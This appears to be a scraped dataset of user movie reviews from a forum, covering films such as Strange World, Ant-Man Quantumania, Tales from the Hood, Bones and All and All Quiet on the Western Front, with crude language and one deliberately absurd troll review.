The screwed the pooch on the ending big time and that's why I gave it a 6.8 out of 10 rather than a 7.5.


Had the ending fight scenes been done better my only major score dropper would have been the overly dark approach they took with the under water scenes and the original movies charm not being present. 


So yeah, 6.8 out of 10 is what i give it.
Overall I'd suggest it's worth the watch but you'll find things to critic for sure.

Definetely better than most of the Disney remakes have been...In my opinion.",moviereviews,4441,821,106,0

1684862966.0,Strange World (2022),"On paper, there’s nothing inherently wrong with *Strange World* using the structure of *Fantastic Voyage* as the basis for a parable of environmental activism.  Audiences are fine with stories with eco-friendly messages, provided they are told with creativity, imagination and humor (see *Wall-E*).  The problem with *Strange World* isn’t that it's “woke”, it's that it completely fails as entertainment.  The movie lacks all of the ingredients that made Disney animated films like *Encanto*, *Moana*, *Frozen* and *Tangled* so much fun.  The characters are thin, the dialog is vapid  and the visuals are lackluster.  Even the color palette used is a collection of dark greens, pinks and purples.  (Flaming red bird-like creatures appear to liven things up occasionally.)  The voice acting from everyone involved leaves much to be desired (Gyllenhaal is whiny and awful), but the script is so bland I can hardly fault the cast.  The dialog is so forgettable and humorless I’m convinced a script polish never happened.  Finally, *Strange World* somehow manages to screw up the time-honored tradition of the funny sidekick.  Splat is basically a squishy toy that bleeps and bloops like a droid from *Star Wars*.  Disney should have decided against releasing this movie theatrically on their centennial and sent it directly to streaming.  That this movie was the follow-up to *Encanto* is a mystery.  **Not Recommended**.

1684420573.0,Ant-man and the Wasp Quantumainia: A comprehensiveish review/rant,"I’ll start off by saying that these are my own personal thoughts and opinions about this movie. I have also seen every Marvel movie and show (excluding any children’s cartoons cause it would be weird if I had seen them apart from siblings watching them). I have no qualifications to be called an “expert” in movie reviews but this is the internet and I can do what I want. This also my first time writing something like this so forgive me if it’s a bit, personal…

THE REVIEW

Ant-man and the Wasp Quantumainia (ATWQ for simplicity) was terrible. It was straight up terrible. Not only is it mind numbingly boring, but the low quality “action” scenes actually gave me a headache. 

The plot, if you can call that a plot, was just one long winded over explanation after another with the characters sitting at the same table with the same camera angles.

Peyton Reed (the director of all the Ant-man movies) does not know what he’s doing. I know that I have never had any experience in directing a movie and that it’s incredibly difficult but, 200 million dollars is a lot of money to waste on a 2 hour movie of terrible acting, shitty lighting, and SFX that made me want to puke. 

I don’t have much experience in the film industry but I think I could have done better. If it had been directed by literally anyone else it would have been better. 

Reed underutilized so many characters that were introduced and dropped and then brought back in almost randomly. He also underutilized the actors in a way. Paul Rudd is a relatively great actor and this movie is definitely not his finest moment. I never really blame the actors (unless they are actually terrible) I blame the directors since actors normally do what the director tells them to do. It’s their job. 

In summary, ATWQ was absolutely terrible and a waste of 200 million dollars and 2 hours of my time. I don’t think there is anything I can say that isn’t ranty so I’ll stop my review here and move on to the rant.

THE RANT

Where do I even begin. I’ll start with Peyton Reed. Reed is a terrible director. I will give him Ant-man (the first one) was actually good, but they just get progressively worse. This dumpster fire of a movie isn’t fully Reeds fault though but still he has a track record of terrible movies.

In ATWQ, Reed and his team made it look like a really expensive amateur film. Shitty camera angles, lighting so bad that some of the actors looked like cheese, and the SFX looks like it was done by someone who just used Blender for the first time. 

The camera angles are awful. It’s almost like the team that made this movie were fresh out of film school , like they had graduated with average grades and no praise from any professors the previous day, and they were hired on because no one wanted to work under Peyton Reed. They reuse the same angles over and over and it makes the whole movie more boring and uninteresting. 

The lighting is atrocious. I had to actually look away at times because it was so bad. Rudd was a victim of terrible lighting. He looked like American cheese still in the plastic films. I understand that ATWQ takes place in the quantum realm but there are almost no textures. There was even a scene where Scott’s suit didn’t have any textures and in looked way to smooth. Like they sanded the suit down and buffed it it out. 

The SFX is the worst part aside from the horrible execution of lines and “serious” moments. They completely butchered M.O.D.O.K. M.O.D.O.K is one of my favorite marvel characters but the one they created in ATWQ made me physically sick. I know he’s supposed to be an abomination, but the one they created is worse. Let’s talk about the penis ships. What were they thinking when they designed those? “Let’s make ships for the people that we basically ignore the entire movie, and we’ll make them look like penises.” 

I could go on but I don’t think I want to waste anymore time picking apart a terrible movie.

In conclusion, Ant-man and the Wasp Quantumainia is an absolute shit show and is officially worse then Eternals.

The only saving grace is that it has important pivots for the rest of this phase of Marvel (considering the next Avengers movie is called The Kang Dynasty). It was terribly done and could have been so much better.

I say all this with the complete understanding that the people who make these movies are not machines and that it takes a long time to make a movie. But I have not witnessed something so terribly done (aside from morbius) in a while, and I avidly watch movies with a budget of maybe $100-$500. The fact that they spent $200,000,000 on making ATWQ is baffling to me. It’s the average amount spent on all the marvel movies and they just laughed in everyone’s faces and lit it on fire. 

Anyway, I’m done. Thanks for reading if you made this far.",moviereviews,4816,873,81,0

1684163197.0,Ratatoing review," I have never watched ratatoing (ra-ta-toyng, not Ra-ta-too-ing as many of you fucking numbskull butthole sniffers think), however I think it probably is a good film, of course you do have to understand that the film Ratatouille copied it entirely. The film does have some racist tropes (the cat looks stupid = I hate ethnic minorities) but it is very easy not to notice this, therefore it doesn't really matter. Of course though as the social justice warrior that I am, I cannot give this film higher than a 7 out of 8.917 because it would trigger another holocaust like the one in 1998 in Tonga. Therefore my final rating for this movie is a 10/10, but I do have to heavily advise you only watch this film if you're 39 years and 3 months old exactly to give a good experience, if you're not born in May or October, then just don't watch this, you people should stick to your own kind and get away from my films.",moviereviews,913,169,18,0

1683944811.0,Let's talk about 'The Cable Guy' (1996),"
TLDR: Movie holds up great and Jim Carrey is an amazing entertainer.

First, I was surprised to learn of the big names that made an appearance in the film. Of course starring Jim Carrey and Mathew Broderick, I also noticed Jack Black, Kyle Gas, Owen Wilson, Andy Dick, and Ben stiller himself (he directed it). 

Second, it made me realize that Jim Carrey is a better actor than I thought. It's not just about him doing another comedy role. He really does give each and every role he takes 100% effort, which is more than I can say for many other actors and actresses today. I think he deserves recognition for that. 

Third, being born in '93, it was kind of a cool nostalgia trip to see things like answering machines, pagers, roll up windows for cars, fat pc monitors and so on. Made me smile.

Fourth, I loved the fact that we never truly learn the cable guy's name. Even in the credits, Jim Carrey's character is listed as 'cable guy'. It's interesting to me to leave it open like that. 

Fifth, there is a great scene in the movie where Steven (Matthew Broderick) discovers that he was secretly recorded saying some rude things about his boss and it had been sent in mass to everyone that he works with so he races around the office trying to stop his boss from watching it. While that is happening, Rob Zombie's 'More Human Than Human' is playing and it just hits hard. Like in that moment, I really felt things going off the rails for him. 

Sixth, I consider myself to be somewhat of a movie/music buff, so it was fun to hear all the random bits of trivial information the cable guy spouts every now and then throughout the movie. In fact, he used his knowledge of TV to come up with various aliases. 

Seventh, they left it open for a sequel at the end. It's a solid set up, the kind of way that made it easy for a second movie to pick up on if they ever wanted to. 

Lastly, there is an ongoing murder trial throughout the movie that seems to have everyone's interest. As the movie goes on,  it's revealed that the cable guy has been using several fake names. As the movie comes to an end, the verdict of the trial is about to be given. I think it would have been really neat to have the cable  guy's character hinted at that he may be  involved in the murder. Like maybe just have one of his fake names come up in the trial. 

Overall, I'd give it a 7/10. Holds up well for the year it was made. If you have never seen it or haven't seen it in a long time. I strongly recommend you go back and revisit it. It's currently on netflix and I had a great time doing so.",moviereviews,2577,490,74,0

1670407804.0,Tales from the Hood 3,"Given that these movies are anthologies I will separate them by movie and story. On mobile so yea ignore grammar. 

Main Story- I hated the fact that they took away Mr. Simms as he was what always tied all the anthologies together. In the first two movies there were reasons to hear these stories with the first one being the tales of the dead at the funeral home and the second one being foundation based on stories to ""better America"". There was no reason for the little girl (with no name) to tell these dark stories and no implications that there was anything sinister with her. So when the ending comes and shes an evil demon lackluster because she was a plain little girl. It wasn't a good twist, Nostalgia Critic said it best when he reviewed M. Night Shyamalan's Devil ""I know what you're thinking, Oh well you didn't predict it so it must be a good twist, well I wouldn't be able to predict if they all turned into snowman of George Takei, but that doesn't mean it's good"". The little girl can turn into anyone or anything and my reaction would be the same. Tony Todd is great to see as always but why did they need to make him a child predator and why did they reveal it sooooo late like it was thrown in last minute. And to compare to the other two movies all the people who were listening to the stories were in some form corrupted and as the movie continues can understand the placement of the final judgment the ones listening to the stories. The third one just suddenly say hes Tony Todd is evil last minute when throughout the movie you had no reason to not like him and want him punished. 


Ruby Gates- I can watch Dead Silence, Winchester, Drag Me to Hell (she died later so i'm counting it) and plenty more and get the exact same story. It was the basic spirit(s) get revenge on person who killed them by haunting and killing then, the only difference is the characters are black (although im sure there are others with black just cant think of any atm) and it's a crocked realtor who kills them to make a profit off their apartment complex.


The Bunker- ""Racism bad, it's the 21st century, hurry up and fade away"" that was literally it. Racist man is considered endangered species and viewed as zoo animal that's pretty much it. 


Operatic- Why make another body possession story when it was in the second? Soul takes over someone else's body and becomes famous. In the second one, the thugs wanted money, didn't get it, killed Cliff Bettis, Thugs meet Psychic, Bettis possess Psychic, Thugs die, Bettis becomes famous in Psychics body. The third one sounds very similar to this one, Chela wants to be famous, man introduces her to old sick opera singer, Chela doesn't like her and plots to kill her with man, Chela slowly kills opera singer, Chela gets money, Chela gets possessed by Opera singer, Opera singer becomes famous in Chela's body. Both have an selfish person who wants something, kills someone to try and get what they want, said person possessing someone, selfish person dies, person who possessed body becomes famous. 


Dope Kicks- The premise was interesting with Percy suffering the fate of his last victim, going through rigor mortis while alive, but then the hallucinations with angel and bird person was dull and I didn't care about it. Honestly I felt that all it really had was the premise, but it started adding more and more that I lost interest in the process. ",moviereviews,3410,613,76,0
1670407701.0,Tales from the Hood 2,"Given that these movies are anthologies I will separate them by movie and story. On mobile so yea ignore grammar. 


Main Story- This was very ""in your face"" especially given who our president was at the time. It was basically WWTD (What Would Trump Do?) If he controlled Robo-Cop and the Devil ended up incriminating him instead? Keith David did a awesome job as Mr. Simms and was a new intake that I liked. 


Good Golly- This just fell flat. If anything the story felt more insulting as blantant racism was shown with no real lesson. White girl say ""Nigger"" and wanting to have her own golly dolls and her BLACK best friend doesn't say shit and is just cool with it and dismisses other blacks feeling towards racism as ""taking it took seriously"" or ""something to laugh about now"". Now unless the person is Uncle Ruckus from the Boondocks and has some form of internalized hatred towards themselves I personally and have yet to see anyone black or not accept such disrespect with open arms. The majority of this story felt like the line ""Im not racist, I have black friends"". Then the racist girl getting pregnant by the doll just threw me off and at the end of it, the only positive to the story is that the showed the Puppet from the first movie. This was the worst in this movie. Also on another side note, did no one report the three main characters missing? Surely some sign would point to this museum and someone would wonder what happened to them.


The Medium- I actually enjoyed this story as it kind of reminded me of the main story of the first movie a bit. The thugs in this story can parallel to the ones in the first given that they only care for their selfish materialistic gain and will kill anyone to get it and at the end get THE SHIT 🤣 handed to them. The Psychic was hilarious and him panicking at how his lies will kill him was very realistic and I can see that situation unfolding in real life. So although not the strongest of the stories I will say it was one of the good ones in the series.


Date Night- The story started off okay, then as it went on it got weaker and weaker. The story had no definite lead and didn't connect. There was no flow and went from: Predators drug girls to rape and record them (okay let's see how this goes), turns out girls are vampires (what? Where tf this come from?), Girls are predators too (Okay they could've done numerous other ways with that than vampires), feed main predators to past vampire victims (why keep the victims? And its random af). This story wasn't that memorable at all.


The Sacrifice- The best story of this movie and held onto the messages that the first movie portrayed. The way the tale tells the Emmett Tills story was brilliant and the continued to bounce from past to present day. In doing this, it really shows that we as black people have come a long way for the better and though there are still MANY trials and tribulations, a lot of people have made it easier bit by bit to which I am thankful for. I felt this was a VERY powerful piece on racial commentary and would recommend watching this story among the rest. ",moviereviews,3109,575,56,0
1670407610.0,Tales from the Hood,"Given that these movies are anthologies I will separate them by movie and story. On mobile so yea ignore grammar. 

Main Story- Clarence Williams III made this movie with his outstanding performance and Mr. Simms. I applaud all the actors of this movie, but in each story I couldn't wait to get back to this A plot solely because of him and how he brought such a goofy, humorous, and yet twisted energy in every scene he was in. It makes it better, when you realize what position he is in and possibly facing death I started to think did he take some of the drugs himself or THE SHIT🤣 as he called it. The story itself was the mere definition of the word unsettling as I can immediately tell these cocky drug dealers are screwed then moment they messed with Mr. Simms. And even though I guessed the ending, I still wanted to see it because the main story kept me interested with Mr. Simms craziness and the drug dealers not playing games and wanting to leave. 


Rogue Cop Revelation- Relevant today and looking back now, I love the message that it reveals from the past the present(when the movie was made) and the future(now) as all of it can parallel one another. Police brutality against minorities is still at a high rise. In a recent study, literally a little less than a weak ago it is revealed that for every million U.S. citizens forty-two African Americans, thirty Hispanic, seventeen Caucasian, and Five unknown are killed in police shootings, with blacks being killed at a higher rate by the year. In a lot of cases, many are unarmed and falsely accused of doing an action or having poor life choices which justifies death. Compare councilman Martin Moorehouse from the story to someone like George Floyd, both were unarmed men who did possible minor offenses (Moorehouse was a traffic stop, Floyd was counterfeit) neither warranting physical altercation, both beaten and killed by police, both publicized with drugs being the cause of death (Floyd temporarily) pinning blame in the victim, and even the black cop can relate to other black bystanders who fear being in the potential line of fire. When the black is sent to the asylum, I sympathize, as though I would like to easily claim I would jump to defend, in those moments I would have no idea what to do and glad that I haven't been in such a situation where I have feared for my life or witnessed that. The visuals and gore were cheesy, but of its times. This story will hold up for a while unless history learns. 


Boys Do Get Bruised- Everyone has a fear and I just thought this was executed brilliantly. David Allen Grier does an excellent job by portraying himself as a stern father while at the same time not trusting him. And this is the same guy who was the overly flamboyant reviewer in ""In Living Color"", only to flip the script and become the monster that is a physical abuser. Walter seeing a monster instead of a his father was great and I loved the how everything was presented. The best scene was when when Walter first showed the monster to his teacher he was drawing all the things he doesn't like. One of the drawings Walter drew was his classmate, Tyrone. At the end of this specific scene, he crumbles up the drawing of Tyrone and you hear a kid squeal and it cuts to the be at scene where you find out Tyrone broke all his bones (Drawing turns out too be pretty much voodoo doll, whatever damage to the drawing happens to the person). And literally, call me dark and sadistic, but when I saw that scene I thought that Walter was sooooo petty I die laughing every time. 


KKK Comeuppance (puppets)- One of my favorites in the entire trilogy as til this day those puppets creep the hell out if me. I watched this movie when I was seven or eight, and I got the gist that a racist white man was living in a house that was curse, and because he was racist in that house, these scary ass looking puppets came out of a painting one by one and killed him on the end, showing one of them for most of the tale. I'm black and my seven- eight year old mind was under the impression that if I laugh at a racist joke or have a racist thought, then I will encounter those damn puppets, and the piano and violin that played was not helping at all and scared me more. I love horror, have interest in crime and all of that, but will I own anything looking similar to that? Hell fucking no. Of course now that I'm older I understand more of the basis of the curse and the slaves that haunt it, but I will watch this on occasion from afar, will always be my favorite, just made me shy away from most things doll related (except for Barbies surpringly)


Hard Core Convert- it was a good way to connect to the main story and set up the final ending for the movie wonderfully, however this was one of the moments where I was bored in the beginning, but it had a strong ending. The thugs seeing Crazy K and becoming aggressive towards Mr. Simms and connecting their connections to Crazy K makes their segway to Hell intelligible. Crazy K being forced to confront all the people he has killed and given the option to repent always made me wonder his fate and if he actually repented what would've happened? My favorite scene when as he was justifying to each person why he killed them, a little girl he doesn't know suddenly appears. It is revealed that during a ruckus between him and other people, the little girl got shot in the process. After this was explained, Crazy K says something along the lines of ""A bullet doesn't have a label"". I liked this scene because innocent people are caught on the crossfire all the time in gang violence, it's terrible, it's sad, but it doesn't dance around and have everyone's death have some agenda or grudge behind it. ",moviereviews,5729,1051,103,0

I fucking live for this type of shit. John Wick meets Santa Clause. This is over-the-top action, solid acting, and just a shit ton of fun. This movie is fucking ridiculous, and I mean that as a compliment. This was everything that I wanted *Fatman* to be.

The action in this is spot on. Some of the ways they kill people had me dying fucking laughing. I never thought I needed to see Santa take people out with ice skates, but there I was, witnessing a dream I never knew I had. The same can be said for seeing Santa take people out with a sledgehammer. This movie also pays respect to *Home Alone.* This is a fucking a fantastic action movie with Christmas magic sprinkled in. David Harbour killed it as Santa Claus. On top of him being a badass, he was charming and brought some hope with his Santa. In a shocking turn of events, John Leguizamo was also excellent as the lead bad guy. I’m usually not a fan of his, so my saying he was great was not expected. They gave Santa a different backstory here. At some point, he was a badass Viking. But, as I said, this is just dumb fun.

There are a few minor issues. Some of the one-liners didn’t land, and felt a little too forced in there. The Santa backstory also has some holes. How did he go from Viking to Santa? Where does the Christmas magic come from? Or maybe these will be answered in a sequel. Fuck I hope they make more of these.	

While Golderbergs badass take on Santa in *Santa’s Slay* wont be topped. This version is close to 2nd place. This movie will definitely be rewatched every Christmas season going forward. 9/10",moviereviews,1599,299,40,0

1669611996.0,Bones and All review + discussion,"It's been a while since I watched a movie that has affected me as hard as Bones and All did. I watched it last night at the theatre, alone, so that also may have contributed to my experience, I'm sure. This movie confirmed that Timothee Chalamet is one of the greatest actors of our time. It's interesting to watch as people in the audience got so audibly excited when he came to the screen. His talent is enchanting, and such excitement comes from just being a witness to it. Taylor Russel is excellent as well. She is a gentle actress, and I feel this role called for that. Luca Guadagno was able to seamlessly collide the romance of the characters and the gore of the storyline. The movie was so close to perfect. It took such a tight hold of me. There was never a question of whether it was believable enough. I was left with some questions about the condition of being an 'eater,' but questions that I'm almost glad went unanswered. I feel a movie can put too much pressure on itself to answer all possible questions of the audience, everything needing a cause and plausible responses. In this case, I'm happy with leaving things unknown so that my focus is not on the storyline's science or logistics. Having a sci-fi element to a story gives me worry that I will be taken out of the story as something will be stupid or funny in its absurdity; this was not the case for Bones and All. Marin and Lee's relationship could have been better. I have seen better, even stronger love stories. Still, to me, their innocence and honesty in having a bad romance were humanizing for them as characters and relieving for me as an audience member.

The movie was beautiful to watch. Shots and scenes were paintings; the light used was the most memorable. Creating safety on earth using light and sunlight beams brought tangible warmth to the theatre. The horror elements were so successful and used the perfect number of times; evidence of this is found in audience reactions. Even sound was successful, making audience members shift and squirm as Marin and Lee feed. The dialogue was simple; admittedly, at times, I felt scenes could have been a little more structured in lines. However, there were some moments where the dialogue was effective, around the campfire, for example. Still, at times Marin and Lee's conversations felt improved in a way that was a little more transparent than I thought necessary. A movie, to me, is supposed to make you feel something, anything, but definitely something, and I felt this movie made me feel everything. Shameless tears in the theatre were shed, screams of shock, moans of disgust, innocent and relieving laughs, smiling and sighing all felt in those two hours. Now I am arguably a dramatic person, but the walk home from the theatre is still a haze as the movie, like the best type always does, put me in this tight hug of a trance that didn't shake for many hours after. I have and will recommend this movie to anyone who has ever felt feelings of fear, sadness, unknowing, pleasure or happiness. Or to anyone who wants to feel those things. The year isn't over yet, but this has shot up to be one of my favourites of 2022 and maybe even my favourites of all time list. I'll have to watch it again to make sure though!",moviereviews,3260,585,84,0

starring Felix Krammerer, Albrecht Schuch, Daniel Bruhl, Sebastian Hülk, Aaron Hilmer, Edin Hasanovic and Devid Striesow
screenplay by Ian Stockell, Lesley Patterson and Edward Berger
directed by Edward Berger
Rating:  ♦♦♦♦♦

This is the 2022 German re-make of the original 1930 American film (directed by Lewis Milestone), based on the famous 1929 German novel of the same name by Erich Maria Remarque.  I’ve never seen the 1930 film, which habitually ranks as one of the best regarded films ever made.  I have read the novel three times in English, and I’ve watched the 1979 made-for-TV film version starring Richard Thomas and Ernest Borgnine, directed by Delbert Mann.  I rather like that film version.  I’ve watched it several times.

Called “Im Westen nichts Neues,” it is epic both in duration (2½-hours) and scope.  It’s brutally graphic.

This new version is a German-language film with English subtitles, which is okay.  But is it improved?  Does authentic German screenwriting, acting and soundtracking measurably improve it?  Maybe purists would automatically say so without much thought, calling it an existential improvement, maybe.  Or, some might say that the German version is an effort to advance Germany’s discourse about the war and responsibility.  Allied veterans could return home celebrated as proud heroes.  But not so German veterans who faced shame and guilt, grappling with their place in history.

A lot of the commentary about this film will probably focus more on the current situation in Europe  -  a land war to which Germany is contributing materiel to the Ukrainians to fight the Russians  -  than to the merits of the movie.  That leaves my question of the value of a German re-make unanswered.  Is it important just because it’s a German story that’s finally being told in German?  That’s not enough for me.

The story follows volunteer infantryman Paul Baumer and his classmates from school on the Western Front, 1916-18.  The movie opens with a gruesome scene of German dead being stripped of their clothes.  The uniforms are recycled  -  washed and mended and then re-issued to new recruits.  I thought it was profoundly sad that the dead would be buried naked in the cold earth, not even in the uniforms they fought in.  Throughout the next two years of war, that’s the last time those clothes were clean.  The mud was really impressive.  The volunteers’ aspirations immediately conflict with frontline realities.  Remarque himself was a veteran of the Imperial German Army, and he excelled at describing the stark banalities of military life.  There’s no heroism in it.

It was filmed largely in the Czech Republic which, coincidentally, is where the Ernest Borgnine/Richard Thomas 1979 version was also filmed.  Does that say something about the Czech Republic?  That it has a well-developed film industry, or a very good film liaison office?  Or, maybe the country just naturally looks like a war zone.",moviereviews,2977,482,57,0

1669265765.0,Eve's Bayou (1997) Blog Post,"&#x200B;

[Eve Batiste \(played by Jurnee Smollett\) & Roz Batiste \(played by Lynn Whitfield\)](

At the very start of this film we are introduced to one of the main characters; Eve. She is the middle child of the three children in the Batiste family. I was taken aback within the very first moments of her introduction because I knew I had seen her elsewhere but couldn’t seem to connect the dots. Only to find out later that Eve’s character is played by Jurnee Smollett, who starred as Leti in Lovecraft Country, a show I remember being very excited for when it premiered on HBO because it was backed by Jordan Peele.

Although Eve’s Bayou didn’t involve Jordan Peele in any way, it still managed to keep my attention just like any other work of Peele’s. It could be the fact that the story line covered relatable topics of unfaithfulness and division within a household, while incorporating taboo yet entertaining themes of magic and voodoo. A hint of the supernatural is always intriguing to the individual because it opens the door into the mystery of the unknown and the unforeseeable.

In this specific case, the unknown and the unforeseeable still could not have been obtained through the entertaining taboo of the supernatural.

The first half of the film reveals the flawed character that is Doctor Batiste. In a vulnerable moment his wife, Roz Batiste, reveals her disappointment of him to her sister. She mentions that because Louis was a doctor, she believed he would be different. Different in the sense that he had a mandate to heal the peal of the wounded. In the end, however, his inability to stay faithful to his wife made him capable of being the one who causes the pain and wounds. He was not a healer as Roz thought he was, instead, he was “just like any other man”.

The second half of the film we follow the repercussions of Doctor Batiste’s unfaithfulness to his wife and to his family. We learn how he crossed an immoral boundary with his daughter and witness the journey Eve takes to avenge this betrayal and pain inflicted upon her sister. The interplay of voodoo and magic are brought into the equation in an intricate way to entertain the audience with the mystery of the unknown. All the while, the perception we have of this character who may be on his way of receiving his punishment, was in itself unknown. It is later revealed that the errors of Doctor Batiste may not be as clear cut as we perceived them to be. The writers specifically chose to leave this narrative open-ended. Was the antagonist of the film Doctor Batiste himself, or is it the act of deceit itself?",moviereviews,2605,459,38,0

And of course this fantastic blend of genres and deconstruction cannot be discussed without mention of Anya Taylor Joy and Ralph Fiennes masterful performances as Chef Slowik and Margot. Both their acting and the storytelling surrounding their characters is wonderfully done in a way that made me actually feel something, and this expert writing makes up for the sometimes-predictable plot.

The cast is great, the story feels pretty original to me, the idea was well thought out and it’s got some seriously hilarious moments despite it being pretty dark. It has weirdly got vibes of Midsommar in its art and look and feels but it’s also at the same time a completely different story and type of story. Very clever. I wondered if they put the Midsommar stuff in there on purpose or if it was just coincidence. Even my friend said at the end “it reminded me of something but I can’t put my finger on it.” I said “Midsommar?” To which they responded “exactly!”

I wouldn’t say it’s a “masterpiece” in that kind of way, but it is exceptionally good! If you like a black comedy then this will be 100% right up your street.

You know when you just have a good time seeing a movie and your very intrigued and know it’ll be one you’ll watch again? That’s what I felt. My friend even said they see it again immediately. So that’s got to be a good sign, even when we left the theatre people were chatting over the film, like strangers, chatting together over what they thought about it and all were positive.

1668900541.0,My review of ALL QUIET ON THE WESTERN FRONT (2022),"**All Quiet on the Western Front:** ***""A pair of boots with a rifle.""*** 

Of all wars, certainly the most popular subject for film has been World War II. That conflict has become the standard image of a ""war movie"" over the last 80 years. World War I, by contrast, never really got the same treatment at the theater. It could be the fact that WW2 is more recent, it could be the fact that the Holocaust is an added dimension, it could just be that WW2 was simply even bigger and more devastating, at least in terms of numbers of people and scale of battle. But All Quiet on the Western Front, the original 1930 adaptation, did make a splash. It was ahead of its time with how gritty and brutal it showed modern war to be, and also in taking the ""war movie"" genre down to the common soldier's level; the camera was in the trenches, the characters were mostly enlisted and drafted men. But WWI never really got its definitive great film. There are numerous candidates for WWII, but most likely on the balance of success, acclaim, and popularity it's probably Saving Private Ryan. WWI had its share, less so, of movies over the intervening decades but none achieved this kind of status. One of the more recent films which may be the closest we've gotten to the kind of triumph Saving Private Ryan managed is 1917. Commercially and critically successful, that film managed to convey the mechanized hellscape of WWI in blockbuster style. But notably, the film stays on one character in real time throughout the course of a day. It is concerned with only the characters and doesn't look up to take in a wider view of the war. Saving Private Ryan stays with its small detactchment of soldiers too, but it's about WWII as well as the immediate plot. And that is where this latest adaptation of the 1929 novel distinguishes itself. Painting a relentlessly grisly tableau of the mud-and-skull ridden western front, All Quiet on the Western Front just may be WWI's definitive great film.  


**Pro's:** 

AQOWF is skillful in its use of contrasts to define the tragedy of WWI. It makes good use of the disparity between the peace of nature and the destruction of man-made war. The opening shot is an idyllic forest, quiet and sleepy as a den of foxes tranquilly rest among the trees. We then pan over to another part of the same countryside and, quite literally via the camera movement, we descend into the hell of war. Bodies explode, men are ripped apart, machines obliterate boys, and when the quarters become too close the slaughter is carried out by hand. The movie returns to the animal motif several times; the lines of trucks meandering to the front and the soldiers marching look like ants in their anthill trenches, the gas masks make the men look like horses, whenever the starving men get a rare chance to eat they devour whatever is available like dogs (2 of our leads repeatedly steal from a farmer's coop like the foxes in the opening shot), when the men struggle to take down a lumbering tank it brings to mind lions swarming prey. Running alongside this is a constant reminder that the human beings in this war are reduced to disposable objects. The opening scene follows a German soldier, Heinrich, through his last brutal minutes as he endeavors and fails to survive another futile infantry assault. In the aftermath, the dead men's uniforms are harvested from their corpses, washed, the bullet holes sewn up, and re-issued to fresh recruits (read: fodder). In the end, this person's short life and savage end are reduced only to a nametag, ripped off and tossed aside as the uniform he died in is handed off to the next soldier. A pile of reclaimed boots towers over the trench, the men who wore them forgotten and discarded. The imagery is perhaps most starkly drawn in the practice of collecting dogtags off the deceased. Each man's dogtag is bent and snapped in half and thrown in a bag, all their effort and doomed hope reduced to a scrap of metal. The soldiers who make it and live on bear the marks of survival: when we rejoin our protagonists a year and a half after arriving at the front, their teeth are yellowed, their eyes vacant and heavy. Felix Kammerer as main character Paul Baumer nails the infamous ""Thousand Yard Stare"", especially towards the end when his General announces one last pointless assault. Dignity in this war is simply impossible. When Paul comes across his friend's body while collecting dogtags, all he can do to give him a burial is button his jacket. When he finds himself stranded in a shell crater with a dying enemy soldier he just mortally wounded, all he can do to comfort him is try to wipe the spurting blood away as he gasps for air. Paul cowers in a trench as tanks roll overhead, crushing a man beneath the tracks no different than barbed wire or any other obstacle. As Hemingway would say ""In modern war, there is nothing sweet nor fitting in your dying. You will die like a dog for no good reason."" Another contrast the movie carries well is the slow wheels of bureaucracy and government juxtaposed with the relentless attrition of the war. We repeatedly hard cut from the burning killing fields, laden with broken corpses and drenched in the blood of the unlucky, to the polished sedate offices of the military leadership, luxurious train cars laden with lavish breakfasts and all social graces observed. The color palette shifts immediately from the brown, black, and red of the cratered battlefields to rich woods, soft white linens, and the powder blues of impeccably laundered ceremonial uniforms. As the generals bicker over honor and perceived slights, we cut back to men hacking each other to pieces, stealing the boots off friends who were alive seconds ago, to be worn until the next machine gun burst makes them into corpses seconds from now. The leadership is obsessed with territory and blame, but it's very hard to see which side is which when everything and everyone is caked in mud and guts. German leadership, embodied by General Friedrichs here, is completely out of touch and stuck wallowing in past glories as the defeat closes in. Sitting with his assistant, Friedrichs tells him his future will be secure as the assistant's family makes horse saddles. The irony of this statement, made by a General fighting the war that replaced horses with vehicles, underlines how misplaced the leadership's priorities are. Even the ""good"" leadership, embodied here by diplomat Erzberger (Inglorious Basterds' and Captain America: Civil War's Daniel Bruhl, pulling double duty here as executive producer) is tragically flawed: although he strains to push the boulder of government up hill, in the end he is satisfied and relieved to agree to a less-than-immediate ceasefire, one which spells doom for our protagonist. A glimmer of hope is the only relief in the chaos. A girl's handkerchief, white shining out from the mud and soot, is passed amongst the men throughout the movie. At one point as Paul observes a bonfire we are tempted to think he will burn it, but instead he puts it on, defiantly clinging to something that isn't killing or dying. Finally, at the end, it is retrieved and worn by a survivor. A small victory for something good. A shred of joy rescued from the wreckage. Perhaps something, if only hope itself, can survive this bloodletting.  


**Cons:** 

As if to prove that it does belong to the war movie genre, AQOWF has its share of tropes. Of course the friend who is most gung-ho about the war, who encourages Paul to enlist, is the first to crack from the grim reality of war, and the first to die in it. You have the obligatory ""it's not that bad, we'll get you patched up"" scene when a friend is obviously done for. There is the grown man calling for his mother in the crucible of battle. Paul's friend and farm raiding partner Kat lays out his post-war plan for a family, of course dying shortly after. All fitting, but all done 1,000 times before. Impressively for a 2 & a half hour movie, the only slow parts are the diplomacy scenes. It's probable that the pacing is intentionally ground to a halt here, to underline the snail's pace negotiations as the fighting rages on. And it's appropriate in service to that theme, but the tonal shift is sudden and jarring. These scenes give the viewer a chance to catch their breath, but whether the stop/start edits work in the end will largely depend on the viewer. Another issue, perhaps only for foreign/American audiences (this is a German film) is the use of German for the main characters' dialogue. This is the first adaptation of the novel to present itself in German, and while that's entirely appropriate and accurate, it may unintentionally alienate non-German audiences from the protagonists. In the American psyche, when you put German soldiers yelling in German on the big screen, it's the enemy. And it will take a little bit for non-German speaking audiences to get comfortable with getting their heads around the fact that these are our ""good guys"" to route for. The fact that the film is released on Netflix with the option to have other languages dubbed will alleviate this (although I would still recommend the original German with subtitles). Lastly, while the film so skillfully illustrates its anti-war message, it can be heavy handed at times. The book is quite subtle in its messaging, and while it makes a point of describing the horrors of mechanized war, it never quite comes right out and tells you ""war is bad"". Here, the messaging is pretty obvious and laid on pretty thick. A lighter touch with the messaging would elevate the film to a more nuanced take on human nature. As it stands, it's a well-crafted movie with a blunt message.

**Bottom Line**: Mesmerizing and haunting, WW1 finally gets its due in catastrophic fashion with an epic that drags you into the mud and makes you hunker down through every explosion. Horrific imagery and tender humanity meet to deliver a powerful piece of cinema about the tragedy of modern war. An inevitable tragedy when every man is a pair of boots with a rifle. **8.5 stars out of 10.**",moviereviews,10100,1759,233,0
1668809191.0,A Very Long And Very Crude Review/Synopsis of Black Adam - SO MANY SPOILERS,"&#x200B;

